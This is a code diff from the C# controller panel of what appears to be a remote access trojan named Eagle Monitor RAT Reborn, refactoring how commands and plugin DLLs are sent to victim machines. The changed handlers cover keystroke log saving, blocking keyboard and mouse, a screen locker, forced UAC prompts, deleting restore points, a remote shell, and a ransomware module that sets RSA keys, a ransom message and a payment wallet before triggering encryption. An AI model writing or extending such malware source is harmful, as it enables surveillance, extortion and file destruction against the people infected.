+                File.WriteAllText(this.ClientHandler.ClientPath + "\\Keystrokes\\" + Misc.Utils.DateFormater() + ".txt", keystrokeRichTextBox.Text);
             }
         }
         #endregion
         #region "Chat"
         private void chatGuna2Button_Click(object sender, EventArgs e)
         {
+            RemoteChatPacket chatPacket;
             if (this.chatGuna2Button.Text == "Start")
             {
-                this.chatHandler = new ChatHandler();
-                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON);
-                chatPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Chat.dll"), 1);
-                chatPacket.baseIp = this.clientHandler.IP;
-                this.clientHandler.SendPacket(chatPacket);
+                this.ChatHandler = new ChatHandler();
+                chatPacket = new RemoteChatPacket(PacketType.CHAT_ON)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Chat.dll"), 1),
+                    BaseIp = this.ClientHandler.IP
+                };
+                ClientHandler.StartSendData(this.ClientHandler, chatPacket);
                 this.chatGuna2Button.Text = "Stop";
             }
             else
             {
-                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF);
-                chatPacket.baseIp = this.clientHandler.IP;
-                this.chatHandler.clientHandler.SendPacket(chatPacket);
+                chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF)
+                {
+                    BaseIp = this.ClientHandler.IP
+                };
+                ClientHandler.StartSendData(this.ChatHandler.ClientHandler, chatPacket);
                 this.chatGuna2Button.Text = "Start";
             }
         }
 
         private void chatSendGuna2Button_Click(object sender, EventArgs e)
         {
-            if (this.chatHandler != null)
+            if (this.ChatHandler != null)
             {
-                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON);
-                chatPacket.msg = usernameChatGuna2TextBox.Text + ": " + messageChatGuna2TextBox.Text + "\n";
-                chatPacket.baseIp = this.clientHandler.IP;
+                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON)
+                {
+                    msg = usernameChatGuna2TextBox.Text + ": " + messageChatGuna2TextBox.Text + "\n",
+                    BaseIp = this.ClientHandler.IP
+                };
                 this.messageRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
                 this.messageRichTextBox.AppendText(chatPacket.msg);
-                this.chatHandler.clientHandler.SendPacket(chatPacket);
+                ClientHandler.StartSendData(this.ChatHandler.ClientHandler, chatPacket);
                 this.messageChatGuna2TextBox.Text = "";
             }
         }
@@ -1500,42 +1519,54 @@ namespace Eagle_Monitor_RAT_Reborn
         #region "Hardware"
         private void blockKeyboardGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
         {
+            MiscellaneousPacket miscellaneousPacket;
             if (this.blockKeyboardGuna2CheckBox.Checked)
             {
-                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_KB_OFF);
-                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1);
-                this.clientHandler.SendPacket(miscellaneousPacket);
+                miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_KB_OFF)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
             }
             else
             {
-                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_KB_ON);
-                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1);
-                this.clientHandler.SendPacket(miscellaneousPacket);
+                miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_KB_ON)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
             }
         }
 
         private void blockMouseGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
         {
+            MiscellaneousPacket miscellaneousPacket;
             if (this.blockMouseGuna2CheckBox.Checked)
             {
-                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_MS_OFF);
-                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1);
-                this.clientHandler.SendPacket(miscellaneousPacket);
+                miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_MS_OFF)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
             }
             else
             {
-                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_MS_ON);
-                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1);
-                this.clientHandler.SendPacket(miscellaneousPacket);
+                miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_MS_ON)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Hardware.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
             }
         }
         #endregion
         #region "UI"
         private void rotateScreenGuna2Button_Click(object sender, EventArgs e)
         {
-            ScreenRotationPacket screenRotationPacket = new ScreenRotationPacket(degreesGuna2ComboBox.Text);
-            screenRotationPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-            clientHandler.SendPacket(screenRotationPacket);
+            ScreenRotationPacket screenRotationPacket = new ScreenRotationPacket(degreesGuna2ComboBox.Text)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            ClientHandler.StartSendData(ClientHandler, screenRotationPacket);
         }
         private void wallpaperGuna2Button_Click(object sender, EventArgs e)
         {
@@ -1544,77 +1575,98 @@ namespace Eagle_Monitor_RAT_Reborn
                 if (ofd.ShowDialog() == DialogResult.OK)
                 {
                     string ext = new FileInfo(ofd.FileName).Extension;
-                    WallPaperPacket wallPaperPacket = new WallPaperPacket(Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1), ext);
-                    wallPaperPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-                    clientHandler.SendPacket(wallPaperPacket);
+                    WallPaperPacket wallPaperPacket = new WallPaperPacket(Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1), ext)
+                    {
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+                    };
+                    ClientHandler.StartSendData(ClientHandler, wallPaperPacket);
                 }
             }
         }
 
         private void showTaskbarGuna2Button_Click(object sender, EventArgs e)
         {
-            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SHOW_TASKBAR);
-            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-            this.clientHandler.SendPacket(miscellaneousPacket);
+            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SHOW_TASKBAR)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
         }
 
         private void showDesktopIconsGuna2Button_Click(object sender, EventArgs e)
         {
-            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SHOW_DESKTOP_ICONS);
-            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-            this.clientHandler.SendPacket(miscellaneousPacket);
+            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SHOW_DESKTOP_ICONS)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
         }
 
         private void hideTaskbarGuna2Button_Click(object sender, EventArgs e)
         {
-            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_TASKBAR);
-            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-            this.clientHandler.SendPacket(miscellaneousPacket);
+            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_TASKBAR)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
         }
 
         private void hideDesktopIconsGuna2Button_Click(object sender, EventArgs e)
         {
-            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_DESKTOP_ICONS);
-            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-            this.clientHandler.SendPacket(miscellaneousPacket);
+            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_DESKTOP_ICONS)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
         }
         private void screenlockerGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
         {
+            MiscellaneousPacket miscellaneousPacket;
             if (this.screenlockerGuna2CheckBox.Checked)
             {
-                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SCREENLOCKER_ON);
-                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ScreenLocker.dll"), 1);
-                this.clientHandler.SendPacket(miscellaneousPacket);
+                miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SCREENLOCKER_ON)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ScreenLocker.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
             }
             else
             {
-                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SCREENLOCKER_OFF);
-                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ScreenLocker.dll"), 1);
-                this.clientHandler.SendPacket(miscellaneousPacket);
+                miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SCREENLOCKER_OFF)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ScreenLocker.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
             }
         }
         #endregion
         #region "Audio"
         private void volumeUpGuna2Button_Click(object sender, EventArgs e)
         {
-            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_AUDIO_UP);
-            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-            this.clientHandler.SendPacket(miscellaneousPacket);
+            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_AUDIO_UP)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
         }
 
         private void volumeDownGuna2Button_Click(object sender, EventArgs e)
         {
-            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_AUDIO_DOWN);
-            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-            this.clientHandler.SendPacket(miscellaneousPacket);
+            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_AUDIO_DOWN)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
         }
         #endregion
         #region "Web"
         private void linkWebGuna2Button_Click(object sender, EventArgs e)
         {
-            OpenUrlPacket openUrlPacket = new OpenUrlPacket(linkWebGuna2TextBox.Text);
-            openUrlPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
-            clientHandler.SendPacket(openUrlPacket);
+            OpenUrlPacket openUrlPacket = new OpenUrlPacket(linkWebGuna2TextBox.Text)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            ClientHandler.StartSendData(ClientHandler, openUrlPacket);
         }
         #endregion
         #region "Power"
@@ -1654,8 +1706,8 @@ namespace Eagle_Monitor_RAT_Reborn
                 default:
                     return;
             }
-            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\PowerManager.dll"), 1);
-            this.clientHandler.SendPacket(powerPacket);
+            powerPacket.Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\PowerManager.dll"), 1);
+            ClientHandler.StartSendData(this.ClientHandler, powerPacket);
         }
         #endregion
         #endregion
@@ -1665,9 +1717,9 @@ namespace Eagle_Monitor_RAT_Reborn
         {
             RestorePointPacket restorePointPacket = new RestorePointPacket
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Admin.dll"), 1)
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Admin.dll"), 1)
             };
-            this.clientHandler.SendPacket(restorePointPacket);
+            ClientHandler.StartSendData(this.ClientHandler, restorePointPacket);
         }
 
         private void deleteRestorePointToolStripMenuItem_Click(object sender, EventArgs e)
@@ -1676,21 +1728,21 @@ namespace Eagle_Monitor_RAT_Reborn
             {
                 DeleteRestorePointPacket deleteRestorePointPacket = new DeleteRestorePointPacket(int.Parse(selected.Cells[0].Value.ToString()))
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Admin.dll"), 1)
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Admin.dll"), 1)
                 };
-                this.clientHandler.SendPacket(deleteRestorePointPacket);
+                ClientHandler.StartSendData(this.ClientHandler, deleteRestorePointPacket);
             }
         }
         #endregion
         private void askUACGuna2Button_Click(object sender, EventArgs e)
         {
-            if (!this.clientHandler.isAdmin)
+            if (!this.ClientHandler.IsAdmin)
             {
                 AskAdminRightsPacket askAdminRightsPacket = new AskAdminRightsPacket
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
                 };
-                this.clientHandler.SendPacket(askAdminRightsPacket);
+                ClientHandler.StartSendData(this.ClientHandler, askAdminRightsPacket);
             }
         }
         #endregion
@@ -1732,19 +1784,19 @@ namespace Eagle_Monitor_RAT_Reborn
 
         private void generateRSAKeyGuna2Button_Click(object sender, EventArgs e)
         {
-            if (File.Exists(this.clientHandler.clientPath + "\\Ransomware\\encryption.json"))
+            if (File.Exists(this.ClientHandler.ClientPath + "\\Ransomware\\encryption.json"))
             {
                 DialogResult r = MessageBox.Show("You are going to re-generate RSA keys pair for client, are you sure ?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                 if (r.Equals(DialogResult.Yes))
                 {
-                    Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(clientHandler.clientPath + "\\Ransomware\\encryption.json"));
+                    Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(ClientHandler.ClientPath + "\\Ransomware\\encryption.json"));
                     Dictionary<string, string> rsaKey = Misc.Encryption.GetKey();
                     encryptionInformation.publicRSAServerKey = rsaKey["PublicKey"];
                     encryptionInformation.privateRSAServerKey = rsaKey["PrivateKey"];
 
                     string rsa = JsonConvert.SerializeObject(encryptionInformation);
-                    File.WriteAllText(this.clientHandler.clientPath + "\\Ransomware\\encryption.json", rsa);
-                    this.clientHandler.encryptionInformation = encryptionInformation;
+                    File.WriteAllText(this.ClientHandler.ClientPath + "\\Ransomware\\encryption.json", rsa);
+                    this.ClientHandler.EncryptionInformation = encryptionInformation;
                 }
                 return;
             }
@@ -1767,7 +1819,7 @@ namespace Eagle_Monitor_RAT_Reborn
                 extensions.Add(ext.Cells[0].Value.ToString());
             }
 
-            Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(clientHandler.clientPath + "\\Ransomware\\encryption.json"));
+            Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(ClientHandler.ClientPath + "\\Ransomware\\encryption.json"));
             encryptionInformation.wallet = walletGuna2TextBox.Text;
             encryptionInformation.msg = msgRansomwareGuna2TextBox.Text;
             encryptionInformation.paths = paths;
@@ -1777,21 +1829,25 @@ namespace Eagle_Monitor_RAT_Reborn
             encryptionInformation.subfolders = subDirectoriesGuna2CheckBox.Checked;
 
             string newInformation = JsonConvert.SerializeObject(encryptionInformation);
-            File.WriteAllText(this.clientHandler.clientPath + "\\Ransomware\\encryption.json", newInformation);
-            this.clientHandler.encryptionInformation = encryptionInformation;
+            File.WriteAllText(this.ClientHandler.ClientPath + "\\Ransomware\\encryption.json", newInformation);
+            this.ClientHandler.EncryptionInformation = encryptionInformation;
 
-            RansomwareEncryptionPacket ransomwareEncryptionPacket = new RansomwareEncryptionPacket(this.clientHandler.encryptionInformation.publicRSAServerKey, this.clientHandler.encryptionInformation.paths, this.clientHandler.encryptionInformation.subfolders, this.clientHandler.encryptionInformation.checkExtensions);
-            ransomwareEncryptionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Ransomware.dll"), 1);
-            ransomwareEncryptionPacket.msg = this.msgRansomwareGuna2TextBox.Text;
-            ransomwareEncryptionPacket.wallet = this.walletGuna2TextBox.Text;
-            this.clientHandler.SendPacket(ransomwareEncryptionPacket);
+            RansomwareEncryptionPacket ransomwareEncryptionPacket = new RansomwareEncryptionPacket(this.ClientHandler.EncryptionInformation.publicRSAServerKey, this.ClientHandler.EncryptionInformation.paths, this.ClientHandler.EncryptionInformation.subfolders, this.ClientHandler.EncryptionInformation.checkExtensions)
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Ransomware.dll"), 1),
+                msg = this.msgRansomwareGuna2TextBox.Text,
+                wallet = this.walletGuna2TextBox.Text
+            };
+            ClientHandler.StartSendData(this.ClientHandler, ransomwareEncryptionPacket);
         }
 
         private void startDecryptionGuna2Button_Click(object sender, EventArgs e)
         {
-            RansomwareDecryptionPacket ransomwareDecryptionPacket = new RansomwareDecryptionPacket(this.clientHandler.encryptionInformation.privateRSAServerKey);
-            ransomwareDecryptionPacket.plugin = PacketLib.Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Ransomware.dll"), 1);
-            this.clientHandler.SendPacket(ransomwareDecryptionPacket);
+            RansomwareDecryptionPacket ransomwareDecryptionPacket = new RansomwareDecryptionPacket(this.ClientHandler.EncryptionInformation.privateRSAServerKey)
+            {
+                Plugin = PacketLib.Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Ransomware.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, ransomwareDecryptionPacket);
         }
         #endregion
         #region "Shell"
@@ -1799,24 +1855,26 @@ namespace Eagle_Monitor_RAT_Reborn
         {
             if (this.remoteShellGuna2Button.Text == "Start Session")
             {
-                this.remoteShellHandler = new RemoteShellHandler();
+                this.RemoteShellHandler = new RemoteShellHandler();
                 StartShellSessionPacket startShellSessionPacket = new StartShellSessionPacket(remoteShellGuna2ToggleSwitch.Checked)
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteShell.dll"), 1)
+                    BaseIp = this.ClientHandler.IP,
+                    HWID = this.ClientHandler.HWID,
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteShell.dll"), 1)
                 };
-                this.clientHandler.SendPacket(startShellSessionPacket);
+                ClientHandler.StartSendData(this.ClientHandler, startShellSessionPacket);
                 this.remoteShellGuna2Button.Text = "Stop Session";
             }
             else 
             {
-                if (clientHandler != null)
+                if (ClientHandler != null)
                 {
                     StopShellSessionPacket stopShellSessionPacket = new StopShellSessionPacket()
                     {
-                        baseIp = this.clientHandler.IP,
-                        HWID = this.clientHandler.HWID
+                        BaseIp = this.ClientHandler.IP,
+                        HWID = this.ClientHandler.HWID
                     };
-                    this.remoteShellHandler.clientHandler.SendPacket(stopShellSessionPacket);
+                    ClientHandler.StartSendData(this.RemoteShellHandler.ClientHandler, stopShellSessionPacket);
 
                     this.remoteShellGuna2ToggleSwitch.Enabled = true;
                     this.remoteShellGuna2TextBox.Enabled = false;
@@ -1840,10 +1898,10 @@ namespace Eagle_Monitor_RAT_Reborn
                     default:
                         NewCommandShellSessionPacket newCommandShellSessionPacket = new NewCommandShellSessionPacket(input)
                         {
-                            baseIp = this.clientHandler.IP,
-                            HWID = this.clientHandler.HWID
+                            BaseIp = this.ClientHandler.IP,
+                            HWID = this.ClientHandler.HWID
                         };
-                        this.remoteShellHandler.clientHandler.SendPacket(newCommandShellSessionPacket);
+                        ClientHandler.StartSendData(this.RemoteShellHandler.ClientHandler, newCommandShellSessionPacket);
                         break;
                 }
 
